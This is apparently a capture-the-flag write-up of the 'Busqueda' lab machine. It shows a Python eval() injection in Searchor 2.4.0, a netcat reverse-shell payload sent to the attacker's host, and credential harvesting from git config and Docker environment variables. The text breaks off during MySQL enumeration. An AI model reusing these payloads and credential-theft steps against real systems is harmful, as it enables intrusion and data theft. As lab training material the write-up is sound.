# Busqueda

## Reconnaissance

### Nmap

```c
$ sudo nmap -A -T4 -sC -sV -p- 10.129.206.38
Starting Nmap 7.93 ( https://nmap.org ) at 2023-04-13 08:59 UTC
Nmap scan report for 10.129.206.38
Host is up (0.094s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4fe3a667a227f9118dc30ed773a02c28 (ECDSA)
|_  256 816e78766b8aea7d1babd436b7f8ecc4 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Did not follow redirect to http://searcher.htb/
|_http-server-header: Apache/2.4.52 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=4/13%OT=22%CT=1%CU=43974%PV=Y%DS=2%DC=T%G=Y%TM=6437C4B
OS:1%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=10A%TI=Z%CI=Z%II=I%TS=A)OPS
OS:(O1=M53AST11NW7%O2=M53AST11NW7%O3=M53ANNT11NW7%O4=M53AST11NW7%O5=M53AST1
OS:1NW7%O6=M53AST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN
OS:(R=Y%DF=Y%T=40%W=FAF0%O=M53ANNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=A
OS:S%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R
OS:=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F
OS:=R%O=%RD=0%Q=)T7(R=N)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%
OS:RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 2 hops
Service Info: Host: searcher.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 5900/tcp)
HOP RTT      ADDRESS
1   71.79 ms 10.10.16.1
2   36.05 ms 10.129.206.38

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 43.39 seconds
```

We added `searcher.htb` to my `/etc/hosts` file.

```c
$ cat /etc/hosts
127.0.0.1       localhost
127.0.1.1       kali
10.129.206.38   searcher.htb
```

### Enumeration of Port 80/TCP

> http://searcher.htb

```c
$ whatweb http://searcher.htb/
http://searcher.htb/ [200 OK] Bootstrap[4.1.3], Country[RESERVED][ZZ], HTML5, HTTPServer[Werkzeug/2.1.2 Python/3.10.6], IP[10.129.206.38], JQuery[3.2.1], Python[3.10.6], Script, Title[Searcher], Werkzeug[2.1.2]
```

We found the information about the running application on the bottom of the page.

```c
Powered by Flask and Searchor 2.4.0
```

## Foothold

### Research on the Vulnerability

We did some research and found a potential `Arbitrary Code Execution` vulnerability in version `2.4.2`.

> https://security.snyk.io/package/pip/searchor

> https://security.snyk.io/vuln/SNYK-PYTHON-SEARCHOR-3166303

> https://github.com/ArjunSharda/Searchor/commit/29d5b1f28d29d6a282a5e860d456fab2df24a16b

```c
def search(engine, query, open, copy):
    try:
        url = eval(
            f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
        )
```

`xvt` did the extra mile and verified that the vulnerability was also present in the currently running version.

> https://github.com/ArjunSharda/Searchor/blob/4e56154829a4225ac1f0e9842d56e7de46bf148e/src/searchor/main.py

```c
def search(engine, query, open, copy):
    try:
        url = eval(
            f"Engine.{engine}.search('{query}', copy_url={copy}, open_web={open})"
        )
```

### Exploitation via Python Code Injection

> https://sethsec.blogspot.com/2016/11/exploiting-python-code-injection-in-web.html

Skeleton Payload:

```c
eval(compile("""for x in range(1):\\n import os\\n os.popen(r'COMMAND').read()""",'','single'))
```

Modified Payload:

```c
foobar'+eval(compile('for x in range(1):\n import os\n os.system(\'ping -c 3 10.10.16.24\')','a','single'))+'
```

We fired up `Burp Suite` and intercepted the request.

Request:

```c
POST /search HTTP/1.1
Host: searcher.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 188
Origin: http://searcher.htb
DNT: 1
Connection: close
Referer: http://searcher.htb/
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

engine=Accuweather&query=foobar%27%2Beval%28compile%28%27for+x+in+range%281%29%3A%5Cn+import+os%5Cn+os.system%28%5C%27ping+-c+3+10.10.16.24%5C%27%29%27%2C%27a%27%2C%27single%27%29%29%2B%27
```

Received callback:

```c
$ sudo tcpdump -envi tun0 icmp
tcpdump: listening on tun0, link-type RAW (Raw IP), snapshot length 262144 bytes
09:23:41.209799 ip: (tos 0x0, ttl 63, id 31557, offset 0, flags [DF], proto ICMP (1), length 84)
    10.129.206.38 > 10.10.16.24: ICMP echo request, id 1, seq 1, length 64
09:23:41.209810 ip: (tos 0x0, ttl 64, id 28793, offset 0, flags [none], proto ICMP (1), length 84)
    10.10.16.24 > 10.129.206.38: ICMP echo reply, id 1, seq 1, length 64
09:23:42.229627 ip: (tos 0x0, ttl 63, id 31745, offset 0, flags [DF], proto ICMP (1), length 84)
    10.129.206.38 > 10.10.16.24: ICMP echo request, id 1, seq 2, length 64
09:23:42.229667 ip: (tos 0x0, ttl 64, id 29009, offset 0, flags [none], proto ICMP (1), length 84)
    10.10.16.24 > 10.129.206.38: ICMP echo reply, id 1, seq 2, length 64
09:23:43.249472 ip: (tos 0x0, ttl 63, id 31789, offset 0, flags [DF], proto ICMP (1), length 84)
    10.129.206.38 > 10.10.16.24: ICMP echo request, id 1, seq 3, length 64
09:23:43.249504 ip: (tos 0x0, ttl 64, id 29049, offset 0, flags [none], proto ICMP (1), length 84)
    10.10.16.24 > 10.129.206.38: ICMP echo reply, id 1, seq 3, length 64
```

Payload for Reverse Shell:

```c
foobar'+eval(compile('for x in range(1):\n import os\n os.system(\'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 10.10.16.24 9001 >/tmp/f\')','a','single'))+'
```

Preparing the listener.

```c
$ bash
```

```c
$ nc -lnvp 9001
listening on [any] 9001 ...
```

Request:

```c
POST /search HTTP/1.1
Host: searcher.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 281
Origin: http://searcher.htb
DNT: 1
Connection: close
Referer: http://searcher.htb/
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

engine=Accuweather&query=foobar%27%2Beval%28compile%28%27for+x+in+range%281%29%3A%5Cn+import+os%5Cn+os.system%28%5C%27rm+%2Ftmp%2Ff%3Bmkfifo+%2Ftmp%2Ff%3Bcat+%2Ftmp%2Ff%7C%2Fbin%2Fbash+-i+2%3E%261%7Cnc+10.10.16.24+9001+%3E%2Ftmp%2Ff%5C%27%29%27%2C%27a%27%2C%27single%27%29%29%2B%27
```

Forwarding it lead to the callback and so to the reverse shell.

```c
$ nc -lnvp 9001
listening on [any] 9001 ...
connect to [10.10.16.24] from (UNKNOWN) [10.129.206.38] 34728
bash: cannot set terminal process group (1488): Inappropriate ioctl for device
bash: no job control in this shell
svc@busqueda:/var/www/app$
```

Now we upgraded the shell.

```c
svc@busqueda:/var/www/app$ python3 -c 'import pty;pty.spawn("/bin/bash")'
```

Here are the steps:

```c
ctrl + z
stty raw -echo
fg
Enter
Enter
export XTERM=xterm
```

And how it looks like.

```c
svc@busqueda:/var/www/app$ ^Z
[1]+  Stopped                 nc -lnvp 9001
```

```c
$ stty raw -echo
```

```c
$ fg
nc -lnvp 9001

svc@busqueda:/var/www/app$ export XTERM=xterm
```

## Enumeration

We started with some basic checks.

```c
svc@busqueda:/var/www/app$ ls -la
total 20
drwxr-xr-x 4 www-data www-data 4096 Apr  3 14:32 .
drwxr-xr-x 4 root     root     4096 Apr  4 16:02 ..
-rw-r--r-- 1 www-data www-data 1124 Dec  1 14:22 app.py
drwxr-xr-x 8 www-data www-data 4096 Apr 13 08:32 .git
drwxr-xr-x 2 www-data www-data 4096 Dec  1 14:35 templates
```

```c
svc@busqueda:/var/www/app/.git$ cat config
[core]
        repositoryformatversion = 0
        filemode = true
        bare = false
        logallrefupdates = true
[remote "origin"]
        url = http://cody:jh1usoih2bkjaspwe92@gitea.searcher.htb/cody/Searcher_site.git
        fetch = +refs/heads/*:refs/remotes/origin/*
[branch "main"]
        remote = origin
        merge = refs/heads/main
```

| Username | Password |
| --- | --- |
| cody | jh1usoih2bkjaspwe92 |

```c
svc@busqueda:/var/www/app$ id
uid=1000(svc) gid=1000(svc) groups=1000(svc)
```

```c
svc@busqueda:/var/www/app$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
usbmux:x:112:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
svc:x:1000:1000:svc:/home/svc:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
fwupd-refresh:x:113:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```

```c
svc@busqueda:/var/www/app$ ls -la /home/
total 12
drwxr-xr-x  3 root root 4096 Dec 22 18:56 .
drwxr-xr-x 19 root root 4096 Mar  1 10:46 ..
drwxr-x---  4 svc  svc  4096 Apr  3 08:58 svc
```

```c
svc@busqueda:~$ ls -la
total 36
drwxr-x--- 4 svc  svc  4096 Apr  3 08:58 .
drwxr-xr-x 3 root root 4096 Dec 22 18:56 ..
lrwxrwxrwx 1 root root    9 Feb 20 12:08 .bash_history -> /dev/null
-rw-r--r-- 1 svc  svc   220 Jan  6  2022 .bash_logout
-rw-r--r-- 1 svc  svc  3771 Jan  6  2022 .bashrc
drwx------ 2 svc  svc  4096 Feb 28 11:37 .cache
-rw-rw-r-- 1 svc  svc    76 Apr  3 08:58 .gitconfig
drwxrwxr-x 5 svc  svc  4096 Jun 15  2022 .local
lrwxrwxrwx 1 root root    9 Apr  3 08:58 .mysql_history -> /dev/null
-rw-r--r-- 1 svc  svc   807 Jan  6  2022 .profile
lrwxrwxrwx 1 root root    9 Feb 20 14:08 .searchor-history.json -> /dev/null
-rw-r----- 1 root svc    33 Apr 13 08:33 user.txt
```

## user.txt

```c
svc@busqueda:~$ cat user.txt
d4c5933a17c08a865851c541376c0bf1
```

## Privilege Escalation to root

### Enumeration

```c
svc@busqueda:~$ cat .gitconfig
[user]
        email = cody@searcher.htb
        name = cody
[core]
        hooksPath = no-hooks
```

| Username |
| --- |
| cody |

The `.gitconfig` pointed to a running `git instance`.

```c
svc@busqueda:~$ ss -tuln
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess
udp   UNCONN 0      0      127.0.0.53%lo:53         0.0.0.0:*          
udp   UNCONN 0      0            0.0.0.0:68         0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:222        0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:41151      0.0.0.0:*          
tcp   LISTEN 0      128        127.0.0.1:5000       0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:3306       0.0.0.0:*          
tcp   LISTEN 0      4096   127.0.0.53%lo:53         0.0.0.0:*          
tcp   LISTEN 0      128          0.0.0.0:22         0.0.0.0:*          
tcp   LISTEN 0      4096       127.0.0.1:3000       0.0.0.0:*          
tcp   LISTEN 0      511                *:80               *:*          
tcp   LISTEN 0      128             [::]:22            [::]:*
```

`Gitea` runs on port `3000/TCP` by default. There was also a `MySQL Database`  running on port `3306/TCP`.

### Accessing the Gitea Instance

#### Option 1: Adding the VHOST to /etc/hosts (recommended option)

The webserver published the instance like `AROx4444` mentioned.

```c
svc@busqueda:~$ cat /etc/apache2/sites-available/000-default.conf    
<VirtualHost *:80>
        ProxyPreserveHost On
        ServerName searcher.htb
        ServerAdmin admin@searcher.htb
        ProxyPass / http://127.0.0.1:5000/
        ProxyPassReverse / http://127.0.0.1:5000/

        RewriteEngine On
        RewriteCond %{HTTP_HOST} !^searcher.htb$
        RewriteRule /.* http://searcher.htb/ [R]

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>

<VirtualHost *:80>
        ProxyPreserveHost On
        ServerName gitea.searcher.htb
        ServerAdmin admin@searcher.htb
        ProxyPass / http://127.0.0.1:3000/
        ProxyPassReverse / http://127.0.0.1:3000/

        ErrorLog ${APACHE_LOG_DIR}/error.log
        CustomLog ${APACHE_LOG_DIR}/access.log combined

</VirtualHost>

# vim: syntax=apache ts=4 sw=4 sts=4 sr noet
```

#### Option 2: Port Forwarding via SSH

```c
svc@busqueda:~$ pwd
/home/svc
```

```c
svc@busqueda:~$ mkdir .ssh
```

```c
svc@busqueda:~$ echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDAiZ0BuXmspO/KEZqHsGB6jfgR9MxK9uRqSInr+uEitc/Qgg6UjMx7acdim1oMazprDLSHnYGf/SCA8C2/G6sEwTmMzRVlLc0BY4nOa01oi7j1AUDZPu1O8tbPLZSTaxaTPeKLlVjmp6isdiwvFcIvcvfo9TvKUK4S5QXnIPAdEv/B+glmiOsZS8QZiPpkSlhvoW1zXkfSemwDrhyiFt44UgV92ji3du52yck1AJ6/XIBs/jODUod/wZdjsxLTSv4AhyplLQno68rNU7+fXduO6jnaJQ9ijz8B9KHSdzvn67NWiqZoJoUKJvUnuHtjP5IiXlvfu+VkhtKnR1tEiJUD5iCvfodvAvWmO4QTUgVX8YNY4wWJCs4Pwxg8N64bdsGxdkK4FwcBSMt/K1nkGxUXDEtX1pZpd1UFJJmxycVJCRu9cdr/tBl89/Bx3iYlfaPdr8cgZO5kC8I/r9KPI/hkPQk19JLg4+A/w4hysGGyHM4NZRUVmRHzlJMfdkXKjywHHMAEhthmPmAU84LLbl74BlRoj4cY245QviCIx9JbPtREbn/y1QIbPkExzqaOZbt9W4X8vuFybj5qqHb0P8DXGon91ISIhyuGB52B3XW6IoogYtYdS4HvCJmPjitfPwHWkNTqdZzOfMIAfYIuwwZkxp6Ha8S2xNrpf0hHYM5syQ==' > .ssh/authorized_keys
```

```c
$ ssh -L 3000:127.0.0.1:3000 svc@searcher.htb
Welcome to Ubuntu 22.04.2 LTS (GNU/Linux 5.15.0-69-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Thu Apr 13 09:28:59 AM UTC 2023

  System load:                      0.0
  Usage of /:                       81.1% of 8.26GB
  Memory usage:                     50%
  Swap usage:                       0%
  Processes:                        240
  Users logged in:                  0
  IPv4 address for br-c954bf22b8b2: 172.20.0.1
  IPv4 address for br-cbf2c5ce8e95: 172.19.0.1
  IPv4 address for br-fba5a3e31476: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for eth0:            10.129.206.38
  IPv6 address for eth0:            dead:beef::250:56ff:fe96:39b9


 * Introducing Expanded Security Maintenance for Applications.
   Receive updates to over 25,000 software packages with your
   Ubuntu Pro subscription. Free for personal use.

     https://ubuntu.com/pro

Expanded Security Maintenance for Applications is not enabled.

0 updates can be applied immediately.

Enable ESM Apps to receive additional future security updates.
See https://ubuntu.com/esm or run: sudo pro status


The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings


Last login: Thu Apr 13 09:22:49 2023 from 10.10.16.24
svc@busqueda:~$
```

> http://127.0.0.1:3000/

> http://127.0.0.1:3000/user/login?redirect_to=%2f

Note: for the further steps, option 2 would lead to a lot of issues with the urls (http://127.0.0.1:3000/cody/Searcher_site).

| Username | Password |
| --- | --- |
| cody | jh1usoih2bkjaspwe92 |

We were able to see the application repository but basically it was a dead end.

### Testing for Password Reuse

```c
svc@busqueda:~$ sudo -l
[sudo] password for svc: 
Matching Defaults entries for svc on busqueda:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,
    use_pty

User svc may run the following commands on busqueda:
    (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
```

It worked.

| Username | Password |
| --- | --- |
| svc | jh1usoih2bkjaspwe92 |

### Checking sudo Privileges

```c
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py *
Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)

     docker-ps     : List running docker containers
     docker-inspect : Inpect a certain docker container
     full-checkup  : Run a full system checkup
```

```c
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS             PORTS                                             NAMES
960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   3 months ago   Up About an hour   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   3 months ago   Up About an hour   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
```

```c
svc@busqueda:~$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .}}' 960873171e2e
```

```c
{"Id":"960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb","Created":"2023-01-06T17:26:54.457090149Z","Path":"/usr/bin/entrypoint","Args":["/bin/s6-svscan","/etc/s6"],"State":{"Status":"running","Running":true,"Paused":false,"Restarting":false,"OOMKilled":false,"Dead":false,"Pid":1730,"ExitCode":0,"Error":"","StartedAt":"2023-04-13T08:32:40.564692247Z","FinishedAt":"2023-04-04T17:03:01.71746837Z"},"Image":"sha256:6cd4959e1db11e85d89108b74db07e2a96bbb5c4eb3aa97580e65a8153ebcc78","ResolvConfPath":"/var/lib/docker/containers/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb/resolv.conf","HostnamePath":"/var/lib/docker/containers/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb/hostname","HostsPath":"/var/lib/docker/containers/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb/hosts","LogPath":"/var/lib/docker/containers/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb/960873171e2e2058f2ac106ea9bfe5d7c737e8ebd358a39d2dd91548afd0ddeb-json.log","Name":"/gitea","RestartCount":0,"Driver":"overlay2","Platform":"linux","MountLabel":"","ProcessLabel":"","AppArmorProfile":"docker-default","ExecIDs":null,"HostConfig":{"Binds":["/etc/timezone:/etc/timezone:ro","/etc/localtime:/etc/localtime:ro","/root/scripts/docker/gitea:/data:rw"],"ContainerIDFile":"","LogConfig":{"Type":"json-file","Config":{}},"NetworkMode":"docker_gitea","PortBindings":{"22/tcp":[{"HostIp":"127.0.0.1","HostPort":"222"}],"3000/tcp":[{"HostIp":"127.0.0.1","HostPort":"3000"}]},"RestartPolicy":{"Name":"always","MaximumRetryCount":0},"AutoRemove":false,"VolumeDriver":"","VolumesFrom":[],"CapAdd":null,"CapDrop":null,"CgroupnsMode":"private","Dns":[],"DnsOptions":[],"DnsSearch":[],"ExtraHosts":null,"GroupAdd":null,"IpcMode":"private","Cgroup":"","Links":null,"OomScoreAdj":0,"PidMode":"","Privileged":false,"PublishAllPorts":false,"ReadonlyRootfs":false,"SecurityOpt":null,"UTSMode":"","UsernsMode":"","ShmSize":67108864,"Runtime":"runc","ConsoleSize":[0,0],"Isolation":"","CpuShares":0,"Memory":0,"NanoCpus":0,"CgroupParent":"","BlkioWeight":0,"BlkioWeightDevice":null,"BlkioDeviceReadBps":null,"BlkioDeviceWriteBps":null,"BlkioDeviceReadIOps":null,"BlkioDeviceWriteIOps":null,"CpuPeriod":0,"CpuQuota":0,"CpuRealtimePeriod":0,"CpuRealtimeRuntime":0,"CpusetCpus":"","CpusetMems":"","Devices":null,"DeviceCgroupRules":null,"DeviceRequests":null,"KernelMemory":0,"KernelMemoryTCP":0,"MemoryReservation":0,"MemorySwap":0,"MemorySwappiness":null,"OomKillDisable":null,"PidsLimit":null,"Ulimits":null,"CpuCount":0,"CpuPercent":0,"IOMaximumIOps":0,"IOMaximumBandwidth":0,"MaskedPaths":["/proc/asound","/proc/acpi","/proc/kcore","/proc/keys","/proc/latency_stats","/proc/timer_list","/proc/timer_stats","/proc/sched_debug","/proc/scsi","/sys/firmware"],"ReadonlyPaths":["/proc/bus","/proc/fs","/proc/irq","/proc/sys","/proc/sysrq-trigger"]},"GraphDriver":{"Data":{"LowerDir":"/var/lib/docker/overlay2/6427abd571e4cb4ab5c484059a500e7f743cc85917b67cb305bff69b1220da34-init/diff:/var/lib/docker/overlay2/bd9193f562680204dc7c46c300e3410c51a1617811a43c97dffc9c3ee6b6b1b8/diff:/var/lib/docker/overlay2/df299917c1b8b211d36ab079a37a210326c9118be26566b07944ceb4342d3716/diff:/var/lib/docker/overlay2/50fb3b75789bf3c16c94f888a75df2691166dd9f503abeadabbc3aa808b84371/diff:/var/lib/docker/overlay2/3668660dd8ccd90774d7f567d0b63cef20cccebe11aaa21253da056a944aab22/diff:/var/lib/docker/overlay2/a5ca101c0f3a1900d4978769b9d791980a73175498cbdd47417ac4305dabb974/diff:/var/lib/docker/overlay2/aac5470669f77f5af7ad93c63b098785f70628cf8b47ac74db039aa3900a1905/diff:/var/lib/docker/overlay2/ef2d799b8fba566ee84a45a0070a1cf197cd9b6be58f38ee2bd7394bb7ca6560/diff:/var/lib/docker/overlay2/d45da5f3ac6633ab90762d7eeac53b0b83debef94e467aebed6171acca3dbc39/diff","MergedDir":"/var/lib/docker/overlay2/6427abd571e4cb4ab5c484059a500e7f743cc85917b67cb305bff69b1220da34/merged","UpperDir":"/var/lib/docker/overlay2/6427abd571e4cb4ab5c484059a500e7f743cc85917b67cb305bff69b1220da34/diff","WorkDir":"/var/lib/docker/overlay2/6427abd571e4cb4ab5c484059a500e7f743cc85917b67cb305bff69b1220da34/work"},"Name":"overlay2"},"Mounts":[{"Type":"bind","Source":"/root/scripts/docker/gitea","Destination":"/data","Mode":"rw","RW":true,"Propagation":"rprivate"},{"Type":"bind","Source":"/etc/localtime","Destination":"/etc/localtime","Mode":"ro","RW":false,"Propagation":"rprivate"},{"Type":"bind","Source":"/etc/timezone","Destination":"/etc/timezone","Mode":"ro","RW":false,"Propagation":"rprivate"}],"Config":{"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},"/etc/timezone":{}},"WorkingDir":"","Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2","maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}},"NetworkSettings":{"Bridge":"","SandboxID":"75c43685d9ba800c34c23be57d00da5e2bad1d389306c14ad85b9e9bce5e3872","HairpinMode":false,"LinkLocalIPv6Address":"","LinkLocalIPv6PrefixLen":0,"Ports":{"22/tcp":[{"HostIp":"127.0.0.1","HostPort":"222"}],"3000/tcp":[{"HostIp":"127.0.0.1","HostPort":"3000"}]},"SandboxKey":"/var/run/docker/netns/75c43685d9ba","SecondaryIPAddresses":null,"SecondaryIPv6Addresses":null,"EndpointID":"","Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"IPAddress":"","IPPrefixLen":0,"IPv6Gateway":"","MacAddress":"","Networks":{"docker_gitea":{"IPAMConfig":null,"Links":null,"Aliases":["server","960873171e2e"],"NetworkID":"cbf2c5ce8e95a3b760af27c64eb2b7cdaa71a45b2e35e6e03e2091fc14160227","EndpointID":"3c90f17cc45dd094e7d58e518aae650268feb2f30fb8c92509b02d2430dac36e","Gateway":"172.19.0.1","IPAddress":"172.19.0.2","IPPrefixLen":16,"IPv6Gateway":"","GlobalIPv6Address":"","GlobalIPv6PrefixLen":0,"MacAddress":"02:42:ac:13:00:02","DriverOpts":null}}}}
```

```c
"GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea""
```

| Username | Password |
| --- | --- |
| gitea | yuiu1hoiu4i5ho1uh |

### Enumeration of the MySQL Database

```c
svc@busqueda:~$ mysql -u gitea -p -h 127.0.0.1
Enter password: 
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 86
Server version: 8.0.31 MySQL Community Server - GPL

Copyright (c) 2000, 2023, Oracle and/or its affiliates.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
```

```c
mysql> SHOW DATABASES;
+--------------------+
| Database           |
+--------------------+
| gitea              |
| information_schema |
| performance_schema |
+--------------------+
3 rows in set (0.00 sec)
```

```c
mysql> USE gitea;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
```

```c
mysql> SHOW tables;
+---------------------------+
| Tables_in_gitea           |
+---------------------------+
| access                    |
| access_token              |
| action                    |
| app_state                 |
| attachment                |
| badge                     |
| collaboration             |
| comment                   |
| commit_status             |
| commit_status_index       |
| deleted_branch            |
| deploy_key                |
| email_address             |
| email_hash                |
| external_login_user       |
| follow                    |
| foreign_reference         |
| gpg_key                   |
| gpg_key_import            |
| hook_task                 |
| issue                     |
| issue_assignees           |
| issue_content_history     |
| issue_dependency          |
| issue_index               |
| issue_label               |
| issue_user                |
| issue_watch               |
| label                     |
| language_stat             |
| lfs_lock                  |
| lfs_meta_object           |
| login_source              |
| milestone                 |
| mirror                    |
| notice                    |
| notification              |
| oauth2_application        |
| oauth2_authorization_code |
| oauth2_grant              |
| org_user                  |
